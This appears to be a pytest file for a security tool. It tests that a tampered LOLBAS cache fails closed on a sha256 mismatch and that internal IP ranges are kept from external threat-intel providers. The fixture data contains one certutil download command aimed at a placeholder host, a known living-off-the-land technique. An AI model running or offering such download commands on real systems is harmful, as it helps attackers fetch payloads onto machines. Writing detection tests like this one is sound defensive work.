"""tests/test_audit_egress_and_integrity.py -- audit T-10 / T-11.

T-10: the LOLBAS cache sidecar records a sha256 that was never verified, so
a tampered cache was silently trusted. It must fail closed (dataset None +
reason => abused-tool enrichment "unknown, not safe").

T-11: threat_intel.is_private_ip missed link-local, CGNAT, "this network"
and IPv6 internal ranges, so such addresses were sent to external TI
providers. Public addresses (including the RFC 5737 documentation ranges the
fixtures use as stand-in attacker IPs) must still be treated as external.
"""
from __future__ import annotations

import hashlib
import json

import pytest

from agents.threat_intelligence import threat_intel
from agents.triage import lolbas

ENTRIES = [{"Name": "Certutil.exe", "Full_Path": [{"Path": "C:\\Windows\\System32\\certutil.exe"}],
            "Commands": [{"Command": "certutil.exe -urlcache -f http://x/a a", "Category": "Download",
                          "MitreID": "T1105"}]}]


def _write_cache(tmp_path, *, sha=None, meta=True):
    raw = json.dumps(ENTRIES).encode("utf-8")
    p = tmp_path / "lolbas.json"
    p.write_bytes(raw)
    if meta:
        (tmp_path / "lolbas.meta.json").write_text(json.dumps({
            "source_url": "https://lolbas-project.github.io/api/lolbas.json",
            "retrieved_at": "2026-10-01T00:00:00Z",
            "sha256": sha if sha is not None else hashlib.sha256(raw).hexdigest(),
            "entries": 1}), encoding="utf-8")
    lolbas._CACHE.clear()
    return p


def test_lolbas_matching_sha_loads(tmp_path):
    ds, reason = lolbas.load_lolbas_dataset(_write_cache(tmp_path))
    assert ds is not None and reason == ""


def test_lolbas_tampered_cache_fails_closed(tmp_path):
    ds, reason = lolbas.load_lolbas_dataset(_write_cache(tmp_path, sha="0" * 64))
    assert ds is None
    assert "sha256" in reason and "unknown, not safe" in reason


def test_lolbas_tamper_after_load_is_detected(tmp_path):
    p = _write_cache(tmp_path)
    assert lolbas.load_lolbas_dataset(p)[0] is not None
    import os
    st = p.stat()
    p.write_bytes(json.dumps(ENTRIES + [{"Name": "Evil.exe"}]).encode("utf-8"))
    os.utime(p, ns=(st.st_atime_ns, st.st_mtime_ns + 10_000_000))
    ds, reason = lolbas.load_lolbas_dataset(p)
    assert ds is None and "sha256" in reason


def test_lolbas_without_sidecar_still_loads_unverified(tmp_path):
    # No recorded hash => nothing to verify against; behaviour unchanged.
    ds, reason = lolbas.load_lolbas_dataset(_write_cache(tmp_path, meta=False))
    assert ds is not None and reason == ""


@pytest.mark.parametrize("ip", [
    "10.1.2.3", "172.16.0.1", "172.31.255.255", "192.168.1.1", "127.0.0.1",
    "169.254.169.254", "100.64.0.1", "100.127.255.254", "0.0.0.0",
    "::1", "fd00::1", "fc00::5", "fe80::1",
])
def test_internal_addresses_are_private(ip):
    assert threat_intel.is_private_ip(ip) is True


@pytest.mark.parametrize("ip", [
    "8.8.8.8", "1.1.1.1", "172.32.0.1", "100.128.0.1", "100.63.255.255",
    "203.0.113.9", "198.51.100.7", "192.0.2.10", "2001:4860:4860::8888",
    "not-an-ip", "",
])
def test_external_or_invalid_addresses_are_not_private(ip):
    assert threat_intel.is_private_ip(ip) is False


def test_link_local_ip_is_never_sent_to_providers():
    iocs = threat_intel.extract_iocs({"source_ip": "169.254.169.254", "destination_ip": "100.64.1.1"})
    flat = json.dumps(iocs)
    assert "169.254.169.254" not in flat and "100.64.1.1" not in flat
